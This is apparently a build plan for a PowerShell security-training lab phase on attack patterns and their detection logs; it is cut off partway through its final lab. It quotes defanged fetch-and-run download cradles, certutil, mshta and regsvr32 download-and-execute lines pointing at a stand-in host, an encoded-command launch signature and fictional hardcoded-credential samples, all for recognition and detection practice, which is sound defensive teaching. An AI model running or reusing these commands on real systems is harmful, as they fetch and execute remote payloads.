# LAB-KIT — `ps` Track, Phase 4 — PowerShell as Attack Surface — BUILD PLAN

**Status:** PLAN ONLY (uncommitted, for review). Binding content spec:
`docs/curriculum/powershell-literacy-lab-curriculum-v1.md` (Phase 4, §6 lines 169–184).
Binding mechanical spec: `docs/kit-contracts.md`. Track conventions inherited unchanged
from `docs/plans/ps-p01-plan.md` (§2a/§2b/§2c) and ps-p2/ps-p3. A later BUILD session
executes this under the Phase Builder protocol (`TRACK: ps  PHASE: 4`). This session was
**plan-only**: nothing built, no pwsh run, nothing committed.

> **How this plan was verified.** pwsh is **not installed** in the planning environment,
> so no output was executed. **This is the track's most attack-dense phase** — download
> cradles, encoded commands, AMSI/CLM, 4104 logging, LOLBins, credential exposure, and
> Empire/PowerSploit structure. Two hard rules govern the whole phase: (1) **every
> attack sample is STATIC, defanged, fictional text the learner reads/classifies —
> executed by neither the learner nor `check.sh`**; the only things that *run* are
> **benign, cross-platform decoders** (base64/UTF-16LE from L3.1) that reveal a harmless
> string, and the PowerShell command-shadow. (2) **AMSI (L4.3) and CLM (L4.4) are
> Windows/PS-5.1 runtime behaviors → `[WINDOWS-VARIANT]`, graded by static reading only.**
> Runtime-dependent facts are flagged `[VERIFY-AT-BUILD]` in §7. **The build session must
> run the same per-lab adversarial correctness pass ps-p01 used before self-test.**

---

## 0. Context — why this plan exists

Phase 4 (map §6): *the phase that makes you dangerous as a reviewer — how attackers use
PS, what the telemetry looks like, and the logging layer that feeds your SOC.* Phase 3
introduced the Windows subsystems (`.NET`, COM, WMI, registry, `iex`, remoting, ACLs);
Phase 4 assembles them into **recognizable attack patterns** and pairs each with its
**detection evidence** — the deliberate red/blue loop this repo's CLAUDE.md mandates. The
hinge is **L4.5 (4104 ScriptBlock logging)**, the explicit bridge to the SOC analyst
course (curriculum §7): after L4.5 a 4104 event is a readable artifact, not an opaque blob.

**9 labs (L4.1–L4.9).** Types (from the map): 5 AUDIT (L4.1, L4.2, L4.6, L4.7, L4.9 gate),
3 DECODE (L4.3, L4.4, L4.5), 1 TOUR (L4.8).

### Three load-bearing facts this phase turns on (settled — build must honor)

1. **Nothing attacker-flavored executes.** Cradles, `-EncodedCommand` blobs, AMSI-bypass
   patterns, LOLBin invocations, and Empire structure are **static, defanged, fictional**.
   `check.sh` runs **only** benign cross-platform decoders and static graders. (§3a.)
2. **Decoding is a real, safe, cross-platform skill.** `-EncodedCommand` is base64 of
   **UTF-16LE** — decodable on Linux pwsh with `[System.Convert]` + `[System.Text.Encoding]`
   (L3.1). The learner **decodes a benign blob to a harmless string** (real probe); the
   malicious blobs are read statically. (L4.2, §3b.)
3. **Every finding carries its detection evidence.** Per the map and CLAUDE.md red/blue
   rule, each attack pattern is taught **with the log artifact it generates** (4104
   ScriptBlock, 4103 Module, Transcription; `powershell.exe -enc` command line; LOLBin
   process/child-process telemetry) and its ATT&CK ID. L4.5 is where reading a 4104 event
   becomes a first-class skill. (§3c.)

### Safety-by-design posture (carry-through — strictest of the track so far)

Attack material is **name/structure-only and static** (§2c inherited, tightened): no
`check.sh` calls `iex`/`Invoke-Expression`/`DownloadString`/`-EncodedCommand`
execution/`Start-BitsTransfer`/`Invoke-WebRequest`/LOLBins; **no AMSI-bypass code is ever
provided in runnable form** — bypasses are described **behaviorally** (what the telemetry
looks like), never as a working recipe. All domains/hosts/IPs are **fictional and defanged**
(`hxxp`, `hxxps`, `[.]`; e.g. `hxxps://cdn.fake-c2[.]test/stage1`). Encoded/obfuscated
samples decode only to **harmless** strings (e.g. `Write-Output 'benign'`). Where a "what
would this do" demo helps, the PowerShell command-shadow (ps-p3 §2 Addition 2) logs
instead of executes. Empire/PowerSploit content (L4.8) is **sanitized structure** —
function/stager *shape*, never payload.

---

## 1. Confirmed lab list (read from the map — ids/titles/types verbatim)

**Phase 4 — PowerShell as Attack Surface (9).** Gate: **L4.9**. No mid-phase gates.

| id | title | type | gate? | win-variant | est_min |
|----|-------|------|-------|-------------|---------|
| L4.1 | Download cradles — `DownloadString\|iex`, `WebRequest`, `BitsTransfer` | AUDIT | no | no | 20 |
| L4.2 | Encoded commands — `-EncodedCommand`, base64 + UTF-16LE, the `powershell.exe` signature | AUDIT | no | no (decode cross-platform) | 20 |
| L4.3 | AMSI — what it does, where it hooks, what bypass attempts look like | DECODE | no | **yes** | 20 |
| L4.4 | Constrained Language Mode — what it restricts, AppLocker/WDAC relationship | DECODE | no | **yes** | 20 |
| L4.5 | PS logging — ScriptBlock (4104), Module (4103), Transcription; reading a 4104 event | DECODE | no | partial (read a shipped event) | 25 |
| L4.6 | LOLBin calls from PS — `certutil`, `mshta`, `rundll32`, `regsvr32` | AUDIT | no | **yes** | 20 |
| L4.7 | Credential exposure — `ConvertTo-SecureString`, plaintext creds, `$Env:` abuse | AUDIT | no | no | 20 |
| L4.8 | Empire & PowerSploit patterns — reading structure without the payload | TOUR | no | no | 20 |
| L4.9 | **Phase gate:** five malicious one-liners — technique + ATT&CK ID + log evidence | AUDIT | **yes** | no (static) | 30 |

**Gate placement.** L4.9 (`gate:true`) — five-one-liner classification (technique / ATT&CK
ID / log evidence). Same "N questions" → **worksheet + `answers.md` + 3-question gate quiz
(3/3)** reconciliation as ps-p2 L2.7 / ps-p3 L3.8.

**Recall placement:**
- **L4.1** — Phase-4 opener → `recall.json`, 5 Qs spanning **Phase 2 + Phase 3**. Phase 3
  is planned but not built, so **sourced from the curriculum's Phase 2/3 lab list** and
  marked **`[VERIFY-AT-BUILD]`**, reconciled with the L4.1 recall **forward-drafted under
  ps-p3 §4 (L3.8)**.
- **L5.1** — Phase-5 opener → drafted during the **L4.9 build** (Phase Builder step 6),
  speced under L4.9 (5 Qs from Phase 3 + 4).

---

## 2. Track-wide build conventions (inherited — restated, plus Phase-4 safety additions)

**File set per lab** (kit-contracts): `meta.json`, `lab.md` (`## BRIEF` ≤10 + `## GUIDED
STEPS`), `quiz.json` (3), `check.sh` (0644, sources `$LAB_CHECKLIB`, `ck_summary` last),
`hints.json` (3, L1 never the answer), `recap.md` (3 lines), optional `files/`,
`recall.json` only where §1 says. Dir grammar `tracks/ps/phases/p4/L4.<n>-<slug>/`.

**§2a grader architecture (inherited).** Deterministic facts → shipped `pwsh -File
probe.ps1` re-run. Reading/AUDIT/TOUR facts → learner extraction artifact + quiz. In
Phase 4 the only deterministic probes are **benign cross-platform decoders** (L4.2
base64/UTF-16LE) and **static reads of shipped samples** (4104 XML in L4.5); everything
attacker-flavored is graded from the learner's audit artifact.

**§2b grader hygiene (inherited).** Single-quote `$`-literals; real `assert_output_contains
"desc" pattern "hint" -- cmd` 4-arg form; `assert_file_exists` before `assert_file_not_contains`;
`.NET`/dotted literals via `assert_file_contains_fixed`; case/word-tolerant ERE, no anchors
on free text; set-e traps.

**➕ §2c attack-content ceiling — Phase-4 hardening (build MUST enforce, step 5 self-check):**
- No `check.sh` executes `iex`/`Invoke-Expression`/`DownloadString`/`Invoke-WebRequest`/
  `Start-BitsTransfer`/`-EncodedCommand` payloads/`certutil`/`mshta`/`rundll32`/`regsvr32`.
- **No working AMSI/CLM bypass is ever shipped** — bypasses are described behaviorally
  (telemetry/indicators), never as runnable code.
- Encoded/obfuscated samples decode only to **harmless** strings; all IOCs defanged +
  fictional; Empire/PowerSploit = sanitized structure, no payload.
- The command-shadow (`files/shadow-iex.ps1`, ps-p3 §2) is the only "execution" stand-in.

**➕ Windows-variant grading rule (inherited, ps-p3 §2).** `[WINDOWS-VARIANT]` labs
(L4.3 AMSI, L4.4 CLM, L4.6 LOLBins) set `meta.json` `"windows_variant": true` and grade
**static recognition** — the Windows behavior is an optional overlay, never a grading
dependency. L4.5 reads a **shipped** 4104 event (static, cross-platform gradable) even
though live 4104 generation is Windows.

---

## 3. Phase-4-specific decisions

### 3a. Attack-dense phase → grade audits + benign decoders, never live attack code

Five AUDIT labs. The failure mode is either (a) executing attacker code, or (b) grading
keyword-stuffable free text. Mitigation: **nothing attacker-flavored runs**; each AUDIT
grades a learner `audit.md`/`finding.txt` for the load-bearing facts (technique, IOC,
ATT&CK ID, log evidence) via case/word-tolerant ERE, paired where possible with a **benign
deterministic probe** (L4.2 decoder; L4.5 shipped-event read) that proves the underlying
skill by construction.

### 3b. L4.2 decoding is the one genuinely runnable, genuinely safe skill

`-EncodedCommand` = base64 of **UTF-16LE** bytes. The learner **decodes** a shipped benign
blob on Linux pwsh (cross-platform, L3.1 machinery) to reveal a harmless string — a real
`pwsh -File` probe. The **malicious** `-enc` blobs (and the `powershell.exe -nop -w hidden
-enc <...>` command-line signature) are read statically and defanged. Decoding ≠ executing:
the grader prints the decoded *text*, never runs it.

### 3c. Every finding ships its detection evidence (red/blue loop, map + CLAUDE.md)

Each attack pattern is taught with the artifact it generates and its ATT&CK ID:
- cradle / `iex` → **4104 ScriptBlock** high-signal line (T1059.001, T1105);
- `-EncodedCommand` → `powershell.exe -enc` **command line** + 4104 decoded block (T1027,
  T1059.001);
- LOLBin → process-creation + parent=`powershell.exe` child telemetry (T1218.*, T1105);
- creds → plaintext/`$Env:` exposure (T1552.001).
**L4.5** makes reading a 4104 event first-class; it is the SOC cross-track hinge and every
other Phase-4 lab forward-references it.

### 3d. The L4.9 gate: five one-liners → worksheet + 3-question gate quiz

Five malicious one-liners ship in `files/`; the worksheet asks, per line, **technique +
ATT&CK ID + log evidence**; answers → `answers.md` (set-e-safe ≥N-of-M threshold); the
3-question `quiz.json` is the formal gate (3/3), forcing the cradle, the `-enc` signature,
and the 4104-evidence reads. Pure static — fully gradable on WSL2, executes nothing.

---

## 4. Phase 4 — lab-by-lab build spec

> Phase-4 spine: *recognize the attack pattern AND name its detection evidence.* Only
> benign decoders and static-sample reads run; every attacker sample is read, not run.

### L4.1 — Download cradles · AUDIT · **Phase-4 opener** · est 20m

**Teaching artifact (AUDIT — static, defanged).** The canonical fetch-and-run patterns.
Learner identifies each cradle variant + its detection evidence.

```powershell
# READ ONLY — static, defanged, fictional (never executed):
iex ([System.Net.WebClient]::new().DownloadString('hxxps://cdn.fake-c2[.]test/s1'))   # classic (L3.1+L3.5) — T1059.001/T1105
IEX (Invoke-WebRequest 'hxxps://fake-c2[.]test/s2' -UseBasicParsing).Content           # IWR variant
Start-BitsTransfer -Source 'hxxps://fake-c2[.]test/p.exe' -Destination "$env:TEMP\p.exe" # BITS (stealthier transport)
```

AUDIT focus: all three = **remote fetch + local run/drop**; the first two are **fileless**
(in-memory `iex` → no disk artifact for file-AV); BITS uses a background service that blends
with updates. **Detection:** cradle+`iex` on one line = high-signal **4104** (→ L4.5);
BITS = `Microsoft-Windows-Bits-Client` log. ATT&CK **T1105** (Ingress Tool Transfer),
**T1059.001**.

**Environment note.** No network, no execution; `check.sh` never fetches or `iex`. Cradle
strings are static/defanged.

**check.sh grades** (static AUDIT; pwsh-free):
- learner writes `audit.md` naming the three cradle variants + evidence + ATT&CK.
  `assert_file_exists audit.md`, `assert_file_contains_fixed audit.md 'DownloadString'`,
  `assert_file_contains audit.md 'BitsTransfer|BITS'`, `assert_file_contains audit.md
  '[Ff]ileless|[Mm]emory|4104'`, `assert_file_contains audit.md 'T1105|T1059'`.

**Quiz (3):**
1. *(choice)* Why is `iex (DownloadString(url))` "fileless"? → **the fetched code runs in
   memory — nothing is written to disk for file-AV to scan**. *(distractor: "it deletes
   itself after")*
2. *(text)* Name a cradle transport other than `WebClient`/`Invoke-WebRequest`. →
   **`Start-BitsTransfer` (BITS)**.
3. *(choice)* One-line detection tell for the classic cradle? → **a 4104 ScriptBlock event
   showing `DownloadString` + `iex` together**. *(distractor: "a firewall deny log only")*

**Recap (3 lines):**
```
download cradles = remote fetch + run: DownloadString|iex (fileless), Invoke-WebRequest, Start-BitsTransfer (BITS)
fileless cradles leave no disk artifact — the evidence is in ScriptBlock logging (4104), not on disk
ATT&CK T1105 (ingress transfer) + T1059.001 — recognize the shape, name the log evidence
```

**recall.json (L4.1 — 5 Qs from Phase 2 + 3) — `[VERIFY-AT-BUILD]` (reconcile with ps-p3
L3.8 forward-draft):**
1. `source: ps L3.1` — Which .NET type does base64 decoding? → **`[System.Convert]`**.
2. `source: ps L3.5` — What does `iex` do? → **evaluates a string as code (PS's eval)**.
3. `source: ps L3.3` — Is `Get-WmiObject` in PS7? → **No — removed; use `Get-CimInstance`**.
4. `source: ps L3.4` — `...\CurrentVersion\Run` significance? → **autostart persistence (T1547.001)**.
5. `source: ps L2.2` — Does a PS `switch` fall through? → **Yes — no implicit break**.

---

### L4.2 — Encoded commands · AUDIT · est 20m

**Teaching artifact (AUDIT — with a benign cross-platform decode probe).** `-EncodedCommand`
(`-enc`) takes **base64 of UTF-16LE**. Decoding is a real skill (L3.1 machinery, cross-
platform); the malicious blobs are read statically; the command line itself is a signature.

```powershell
# the SIGNATURE (static, defanged) — a classic malicious launch:
#   powershell.exe -nop -w hidden -enc <base64-UTF16LE>     ← -nop -w hidden -enc = high-signal combo

# DECODE a BENIGN blob (this runs on Linux pwsh — reveals a harmless string, never executes it):
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGIAZQBuAGkAZwBuACcA'))
#   → Write-Output 'benign'     [VERIFY-AT-BUILD exact blob/decoding]
```

AUDIT focus: `-enc` hides intent from shoulder-surfing/simple string rules but **not from
decoders or logging** — the 4104 event records the **decoded** ScriptBlock. The `-nop -w
hidden -enc` command-line combo is itself a detection signature. ATT&CK **T1027**
(Obfuscation), **T1059.001**.

**Environment note.** The decode probe is **cross-platform** and reveals a **benign** string
(`Write-Output 'benign'`) — the grader prints the decoded *text*, never runs it. Malicious
blobs are static/defanged. `[VERIFY-AT-BUILD]`: exact benign blob ↔ decoded text.

**check.sh grades** (benign decode probe + static audit):
- ship `files/decode-enc.ps1` (the benign UTF-16LE base64 decode above):
  `assert_output_contains "-enc is base64 of UTF-16LE; decodes to the benign string" "benign" "run: pwsh -File decode-enc.ps1" -- pwsh -NoProfile -NonInteractive -File decode-enc.ps1`.
- learner writes `audit.md` naming the encoding (UTF-16LE), the `-nop -w hidden -enc`
  signature, and the 4104-decoded-block evidence. `assert_file_contains audit.md
  'UTF-?16|Unicode'`, `assert_file_contains audit.md '4104|[Ss]cript.?[Bb]lock'`,
  `assert_file_contains audit.md 'T1027'`.

**Quiz (3):**
1. *(choice)* `-EncodedCommand` expects base64 of which encoding? → **UTF-16LE
   (`[System.Text.Encoding]::Unicode`)**. *(distractor: "UTF-8")*
2. *(choice)* Does `-enc` defeat ScriptBlock logging? → **No — 4104 records the *decoded*
   block; `-enc` only hides intent from casual/plain-string inspection**. *(distractor:
   "yes, logging sees only base64")*
3. *(text)* Name one command-line flag combo that signals a suspicious `powershell.exe`
   launch. → **`-nop -w hidden -enc`** *(any of these)*.

**Recap (3 lines):**
```
-EncodedCommand (-enc) = base64 of UTF-16LE; decode it with [Convert]+[Text.Encoding] (cross-platform)
-enc hides intent from the eye, not from decoders or logging — 4104 records the DECODED block
the powershell.exe -nop -w hidden -enc command line is itself a detection signature (T1027/T1059.001)
```

**recall.json:** none.

---

### L4.3 — AMSI · DECODE · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (DECODE — static; behavior only, NO working bypass).** AMSI (Antimalware
Scan Interface) lets PowerShell hand script content to the registered AV (Defender) **at
runtime, after de-obfuscation, before execution** — so it sees the *real* payload even if it
arrived encoded. Learner reads *what AMSI does, where it sits, and what bypass **attempts**
look like as behavior/telemetry* — never a runnable bypass.

```text
# WHERE it sits (read-only): pwsh → amsi.dll → AmsiScanBuffer() → registered AV verdict → allow/block
# WHAT bypass ATTEMPTS look like (behavioral indicators ONLY — no working code shipped):
#   - in-memory tampering with the amsi.dll scan function (reflection/patching) → a crash-prone, high-signal pattern
#   - string-splitting the literal "AMSI" to dodge naive signatures → an obfuscation tell, not a real defeat
#   - forcing an initialization error → detectable behavior
# KEY HONESTY (ties to L0.3): AMSI is a REAL control + telemetry source — bypassable, but defeating it COSTS the attacker and is itself detectable.
```

DECODE moment: AMSI scans **de-obfuscated content at runtime** (its whole point — it beats
encoding). Bypasses exist but are **noisy and detectable**; AMSI is a *real control*, not a
speed bump (L0.3 classification). ATT&CK **T1562.001** (Impair Defenses) for bypass attempts.

**Environment note — `[WINDOWS-VARIANT]`.** AMSI is a Windows runtime component; it does not
exist on pwsh 7 / WSL2. Graded path = **static reading**; Windows overlay optional.
`meta.json` `"windows_variant": true`. **No bypass code is shipped in any form.**

**check.sh grades** (static extraction only; pwsh-free):
- learner writes `notes.txt`: what AMSI scans (de-obfuscated content at runtime), why that
  beats `-enc`, and its L0.3 classification. `assert_file_exists notes.txt`,
  `assert_file_contains notes.txt '[Dd]e.?obfuscat|runtime|de-?coded'`,
  `assert_file_contains notes.txt '[Rr]eal [Cc]ontrol|telemetry|detectable'`,
  `assert_file_contains notes.txt 'T1562'`.

**Quiz (3):**
1. *(choice)* When does AMSI see script content? → **at runtime, after de-obfuscation,
   before execution — so it sees the real payload even if it arrived encoded**. *(distractor:
   "only the base64/on-disk form")*
2. *(choice)* Is AMSI a "real control" or a "speed bump" (L0.3)? → **a real control and
   telemetry source — bypassable, but defeating it costs the attacker and is detectable**.
   *(distractor: "a speed bump like Execution Policy")*
3. *(text)* ATT&CK technique for an AMSI-bypass attempt? → **T1562.001 (Impair Defenses)**.

**Recap (3 lines):**
```
AMSI hands de-obfuscated script content to the AV at runtime — it beats -enc because it sees the REAL payload
bypass attempts (in-memory patching, string-splitting) are noisy and detectable — T1562.001
AMSI is a REAL control + telemetry source (L0.3), Windows-only; you read its behavior statically here
```

**recall.json:** none.

---

### L4.4 — Constrained Language Mode · DECODE · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (DECODE — static).** CLM restricts the language to safe cmdlets/types:
it blocks direct **.NET type access**, `Add-Type`, COM instantiation, and many script-based
attack primitives — but only **when enforced by an application-control engine (WDAC/AppLocker)**.
Bare (`$ExecutionContext.SessionState.LanguageMode` set without enforcement) it is bypassable.

```text
# CLM BLOCKS (when WDAC/AppLocker-enforced): [System.Net.WebClient]::new(), Add-Type, New-Object -ComObject, arbitrary .NET
# CLM ALLOWS: approved cmdlets and a safe language subset
# RELATIONSHIP: CLM is the *language-mode consequence* of WDAC/AppLocker policy — not a standalone toggle you trust
# HONESTY (L0.3): a REAL control WHEN enforced by WDAC/AppLocker; env-var-only (no engine) it is bypassable
```

DECODE moment: CLM's power is exactly the **.NET/COM/Add-Type** reach Phase 3 taught —
under WDAC/AppLocker those become unavailable, defanging most script attacks. Without an
enforcement engine it is not a boundary. This is the L0.3 CLM classification, expanded.
ATT&CK context: WDAC/AppLocker are **M1038** (Execution Prevention).

**Environment note — `[WINDOWS-VARIANT]`.** CLM + WDAC/AppLocker are Windows-only. Graded
path = static reading. `meta.json` `"windows_variant": true`.

**check.sh grades** (static extraction only):
- learner writes `notes.txt`: two things CLM blocks + the enforcement dependency.
  `assert_file_exists notes.txt`, `assert_file_contains notes.txt '\.NET|Add-Type|COM'`,
  `assert_file_contains notes.txt 'WDAC|AppLocker'`, `assert_file_contains notes.txt
  '[Ee]nforc'`.

**Quiz (3):**
1. *(choice)* Name something CLM blocks. → **direct .NET type access / `Add-Type` /
   `New-Object -ComObject`**. *(distractor: "the `Get-*` cmdlets")*
2. *(choice)* When is CLM a real boundary? → **when enforced by WDAC/AppLocker — env-var
   only (no engine) it's bypassable**. *(distractor: "always, on its own")*
3. *(text)* Which controls enforce CLM? → **WDAC and/or AppLocker**.

**Recap (3 lines):**
```
Constrained Language Mode blocks the .NET/COM/Add-Type reach Phase 3 taught — the core of script attacks
CLM is a REAL boundary only when WDAC/AppLocker enforces it; env-var-only, it's bypassable (L0.3)
Windows-only; you read what it restricts statically — WDAC/AppLocker = Execution Prevention (M1038)
```

**recall.json:** none.

---

### L4.5 — PowerShell logging: 4104 / 4103 / Transcription · DECODE · est 25m · *(reads a shipped event)*

**Teaching artifact (DECODE — the SOC hinge; reads a SHIPPED 4104 event, static).** Three
log sources: **ScriptBlock logging → Event ID 4104** (the de-obfuscated script text —
*the* source), **Module logging → 4103** (pipeline execution details), **Transcription**
(full input/output to a text file). The learner **reads a provided 4104 event** and extracts
what ran.

`files/event-4104.xml` (shipped, sanitized — a benign decoded ScriptBlock, defanged):
```xml
<Event><System><EventID>4104</EventID><Channel>Microsoft-Windows-PowerShell/Operational</Channel></System>
 <EventData>
  <Data Name="ScriptBlockText">iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/s1')</Data>
  <Data Name="Path"></Data>
 </EventData></Event>
```

DECODE moment: **4104 records the de-obfuscated ScriptBlock text** — even `-enc`/obfuscated
input is logged decoded (why AMSI+4104 beat encoding). `4103` = module/pipeline detail;
Transcription = the full session transcript. Reading `ScriptBlockText` = reading exactly
what executed. This is the bridge to **SOC L3.2** (Sysmon/Windows events, curriculum §7).

**Environment note.** Live 4104 generation is Windows, but **reading a shipped event is
cross-platform** and is what's graded. `meta.json` may note the Windows overlay; grading
does not require it. `[VERIFY-AT-BUILD]`: keep the sample event well-formed and defanged.

**check.sh grades** (static read of the shipped event → learner extraction):
- learner writes `readout.md`: the Event ID, what `ScriptBlockText` shows, and which log
  source records de-obfuscated content. `assert_file_exists readout.md`,
  `assert_file_contains readout.md '4104'`,
  `assert_file_contains_fixed readout.md 'DownloadString'` (learner transcribed the cradle
  from the event), `assert_file_contains readout.md '[Ss]cript.?[Bb]lock'`.
- optional benign probe confirming the learner can pull the field: ship `files/read4104.ps1`
  (`([xml](Get-Content ./event-4104.xml)).Event.EventData.Data | Where-Object Name -eq 'ScriptBlockText' | ForEach-Object '#text'` … ) → prints the text; `[VERIFY-AT-BUILD]` XML shape. (Reads a static file, executes nothing attacker-flavored.)

**Quiz (3):**
1. *(choice)* Which Event ID carries the de-obfuscated ScriptBlock text? → **4104
   (ScriptBlock logging)**. *(distractor: "4103 Module logging")*
2. *(choice)* Why does 4104 defeat `-EncodedCommand`? → **it logs the *decoded* script that
   actually ran, not the base64**. *(distractor: "it blocks encoded commands")*
3. *(text)* Which log source captures the full session input/output to a file? →
   **Transcription**.

**Recap (3 lines):**
```
ScriptBlock logging → 4104 (the DECODED script text — the source), Module → 4103, Transcription → full transcript
4104 beats -enc/obfuscation: it records what actually ran, decoded — read ScriptBlockText to see the payload
this is the SOC hinge (→ SOC L3.2): a 4104 event is now a readable artifact, not an opaque blob
```

**recall.json:** none.

---

### L4.6 — LOLBin calls from PS · AUDIT · **`[WINDOWS-VARIANT]`** · est 20m

**Teaching artifact (AUDIT — static, defanged).** Living-off-the-Land binaries: signed
Windows tools abused for download/execute so the *attacker* ships no binary. Recognize the
LOLBin + its abuse.

```text
# READ ONLY — static, defanged, fictional:
certutil.exe -urlcache -split -f hxxps://fake-c2[.]test/p.bin p.bin   # download via a cert tool (T1105/T1140)
mshta.exe hxxps://fake-c2[.]test/a.hta                                # execute remote HTA (T1218.005)
rundll32.exe shell32.dll,Control_RunDLL hxxps://...                   # proxy execution (T1218.011)
regsvr32.exe /s /u /i:hxxps://fake-c2[.]test/s.sct scrobj.dll         # "Squiblydoo" scriptlet (T1218.010)
```

AUDIT focus: each is a **signed, trusted** binary doing attacker work (download or proxied
execution) → evades naive allow-lists. Invoked *from PowerShell*, the tell is a
`powershell.exe`→`certutil/mshta/rundll32/regsvr32` **parent→child** process chain.
**Detection:** process-creation (Sysmon 1 / 4688) with that parentage. ATT&CK
**T1218.\*** (System Binary Proxy Execution), **T1105**.

**Environment note — `[WINDOWS-VARIANT]`.** These are Windows binaries; nothing runs on
WSL2. Graded path = static recognition. `meta.json` `"windows_variant": true`.

**check.sh grades** (static AUDIT):
- learner writes `finding.txt` naming ≥3 LOLBins + the parent→child detection tell + an
  ATT&CK ID. `assert_file_exists finding.txt`, `assert_file_contains finding.txt
  'certutil|mshta|rundll32|regsvr32'`, `assert_file_contains finding.txt
  '[Pp]arent|child|process'`, `assert_file_contains finding.txt 'T1218|T1105'`.

**Quiz (3):**
1. *(choice)* Why are LOLBins effective? → **they're signed, trusted Windows binaries — the
   attacker ships no malware and evades naive allow-lists**. *(distractor: "they're
   undetectable by design")*
2. *(text)* Name a LOLBin used for download. → **`certutil`** *(also mshta/regsvr32 for
   execution)*.
3. *(choice)* Best detection tell for a PS-launched LOLBin? → **the `powershell.exe` →
   LOLBin parent→child process-creation event (Sysmon 1 / 4688)**. *(distractor: "the file
   hash of powershell.exe")*

**Recap (3 lines):**
```
LOLBins = signed Windows tools (certutil/mshta/rundll32/regsvr32) abused to download or proxy-execute
the attacker ships no binary — detection is the powershell.exe → LOLBin parent→child process chain
ATT&CK T1218.* (system binary proxy execution) + T1105; Windows-only, read statically
```

**recall.json:** none.

---

### L4.7 — Credential exposure · AUDIT · est 20m

**Teaching artifact (AUDIT — static; fictional creds only).** Find the credential-handling
flaws in provided scripts: plaintext secrets, reversible `ConvertTo-SecureString`, and
`$Env:` secret abuse.

```powershell
# READ ONLY — fictional creds, audit the exposure (do not treat as real):
$p = ConvertTo-SecureString 'Sup3rSecret!' -AsPlainText -Force           # plaintext IN the script → not secret at all
$cred = New-Object PSCredential('svc_admin', $p)
$key = 'hardcoded-32-byte-key...'; ConvertTo-SecureString $enc -Key $key  # symmetric -Key in the script → reversible
Write-Output $env:AWS_SECRET_ACCESS_KEY                                   # echoing a secret env var → leaks to logs/4104
```

AUDIT focus: a `SecureString` built from an in-script plaintext (or with an in-script
`-Key`) is **not secret** — the material is right there; `$Env:`-held secrets **leak into
transcripts/4104** if echoed. **Detection/hygiene:** secrets belong in a vault/secret store,
never in source; scanning source + 4104 for these patterns finds exposure. ATT&CK
**T1552.001** (Credentials in Files).

**Environment note.** `ConvertTo-SecureString`/`PSCredential` exist cross-platform, but
**no probe runs them** — this is a static audit of shipped scripts with fictional creds.

**check.sh grades** (static AUDIT of a shipped flawed script):
- ship `files/creds-sample.ps1` (the above, fictional). learner writes `finding.txt`
  naming ≥2 exposure types + the fix + ATT&CK. `assert_file_exists finding.txt`,
  `assert_file_contains finding.txt '[Pp]lain.?text|AsPlainText'`,
  `assert_file_contains finding.txt '[Vv]ault|[Ss]ecret [Ss]tore|[Ee]nv'`,
  `assert_file_contains finding.txt 'T1552'`.

**Quiz (3):**
1. *(choice)* Is `ConvertTo-SecureString 'x' -AsPlainText -Force` secure? → **No — the
   plaintext is right in the script; the `SecureString` protects nothing**. *(distractor:
   "yes, `SecureString` encrypts it")*
2. *(choice)* Why is `Write-Output $env:SECRET` risky? → **it leaks the secret into
   transcripts / 4104 logs**. *(distractor: "env vars are never logged")*
3. *(text)* ATT&CK technique for hardcoded creds in a script? → **T1552.001 (Credentials
   In Files)**.

**Recap (3 lines):**
```
a SecureString built from in-script plaintext (or an in-script -Key) is NOT secret — the material is right there
$Env: secrets leak into transcripts/4104 when echoed; secrets belong in a vault, never in source
audit source + logs for these patterns — ATT&CK T1552.001 (credentials in files)
```

**recall.json:** none.

---

### L4.8 — Empire & PowerSploit patterns · TOUR · est 20m

**Teaching artifact (TOUR — sanitized structure, NO payload).** Read the *shape* of the two
best-known offensive PS toolkits without any working payload: how a stager is structured and
how the modules are organized — so you recognize the framework in telemetry.

```text
# SANITIZED STRUCTURE ONLY (no payload, no real stager):
# Empire stager shape: [encoded launcher] → [staging key exchange] → [agent tasking loop over C2]
#   tells: base64 launcher, a staging request to a C2, periodic beacon/jitter
# PowerSploit module families (function-name tells):
#   Invoke-Mimikatz (cred theft), Invoke-Shellcode (injection), Get-GPPPassword (recon),
#   PowerView: Get-NetUser / Get-NetGroup / Find-LocalAdminAccess (AD enumeration → Phase 6 L6.1)
```

TOUR focus: recognize the **naming and structure** — `Invoke-<Verb>` offensive functions,
an encoded launcher, a beacon loop — and map them to behavior/telemetry, **without** running
or reconstructing anything. Bridges to **Phase 6 (PowerView tour)** and **SOC L5.4** (sandbox
reports, curriculum §7). ATT&CK: framework-dependent (e.g. T1059.001, T1003 for Mimikatz).

**Environment note.** Structure/names only; **no payload, no stager, nothing runnable** —
strictest read-only lab. Nothing executes.

**check.sh grades** (static comprehension):
- learner writes `tour.md` naming the stager stages and ≥2 PowerSploit/PowerView function
  families + what each does. `assert_file_exists tour.md`,
  `assert_file_contains tour.md '[Ss]tager|[Ll]auncher|[Bb]eacon'`,
  `assert_file_contains tour.md 'Invoke-|Get-Net|PowerView'`,
  `assert_file_contains tour.md '[Cc]2|[Ee]numerat|[Cc]red'`.

**Quiz (3):**
1. *(choice)* What does reading an Empire stager's *structure* (not payload) give an
   analyst? → **recognition of the framework in telemetry (encoded launcher → staging →
   beacon loop)**. *(distractor: "a working copy of the malware")*
2. *(text)* Name a PowerView/PowerSploit function family and its purpose. → **`Get-Net*`
   (AD enumeration) / `Invoke-Mimikatz` (cred theft)** *(any)*.
3. *(choice)* Why read these without the payload? → **recognition is the analyst skill;
   running/reconstructing the payload is neither needed nor safe**. *(distractor: "you must
   run it to understand it")*

**Recap (3 lines):**
```
Empire stager shape: encoded launcher → staging key exchange → beacon/tasking loop over C2
PowerSploit/PowerView tells are function names: Invoke-Mimikatz, Invoke-Shellcode, Get-Net* (AD enum)
you read STRUCTURE to recognize the framework in telemetry — never the payload (→ Phase 6, SOC L5.4)
```

**recall.json:** none.

---

### L4.9 — Phase gate: five malicious one-liners · AUDIT · **GATE** · est 30m

**Teaching artifact (AUDIT — the integrative gate).** Five malicious one-liners
(`files/malicious.txt`, static/defanged); for each: **technique + ATT&CK ID + log evidence**.
Five worksheet questions (× three parts) → `answers.md`; a 3-question gate quiz enforces 3/3.

The five one-liners (static, defanged):
```text
1  iex ((New-Object Net.WebClient).DownloadString('hxxps://fake-c2[.]test/s'))   # cradle — T1059.001/T1105 — 4104
